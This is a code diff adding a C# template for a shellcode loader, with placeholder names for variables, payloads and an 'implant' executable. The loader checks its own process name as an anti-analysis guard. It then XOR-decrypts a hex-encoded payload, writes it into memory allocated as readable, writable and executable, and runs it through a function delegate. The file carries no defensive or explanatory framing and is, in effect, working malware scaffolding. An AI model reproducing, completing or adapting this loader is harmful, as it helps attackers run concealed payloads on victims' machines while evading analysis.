@@ -1,0 +1,89 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace <variable0>
+{
+    public class <variable0>
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+        [DllImport("kernel32.dll")]
+        static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("psapi.dll")]
+        static extern uint GetModuleBaseName(IntPtr hProcess, IntPtr hModule, StringBuilder lpBaseName, uint nSize);
+
+        const uint PROCESS_QUERY_INFORMATION = 0x0400;
+        const uint PROCESS_VM_READ = 0x0010;
+
+
+        delegate void <variable7>();
+
+        static bool <variable1>()
+        {
+            uint <variable10> = (uint)Process.GetCurrentProcess().Id;
+            IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, <variable10>);
+
+            if (hProcess == IntPtr.Zero)
+                return false;
+
+            StringBuilder name = new StringBuilder(260);
+            GetModuleBaseName(hProcess, IntPtr.Zero, name, (uint)name.Capacity);
+            CloseHandle(hProcess);
+
+            string <variable9> = name.ToString();
+            return <variable9>.Equals("<implant.exe>", StringComparison.OrdinalIgnoreCase);
+        }
+
+        public static void HowIDoingTonight()
+        {
+            if (!<variable1>())
+            {
+                return;
+            }
+
+            byte[] <variable2>(string hex)
+            {
+                byte[] <variable11> = new byte[hex.Length / 2];
+                for (int i = 0; i < hex.Length; i += 2)
+                {
+                    <variable11>[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+                }
+                return <variable11>;
+            }
+
+            string <variable4> = "<payload1>";
+
+            string <variable3> = "<payload2>";
+
+            byte[] <variable5> = <variable2>(<variable4>);
+            byte[] key = <variable2>(<variable3>);
+
+            byte[] <variable6> = new byte[<variable5>.Length];
+            for (int i = 0; i < <variable5>.Length; i++)
+            {
+                <variable6>[i] = (byte)(<variable5>[i] ^ key[i % key.Length]);
+            }
+
+            IntPtr sc = VirtualAlloc(IntPtr.Zero, (uint)<variable6>.Length, 0x1000, 0x40);
+            Marshal.Copy(<variable6>, 0, sc, <variable6>.Length);
+
+            <variable7> <variable8> = (<variable7>)Marshal.GetDelegateForFunctionPointer(sc, typeof(<variable7>));
+            <variable8>();
+        }
+    }
+
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            <variable0>.HowIDoingTonight();
+        }
+    }
+}
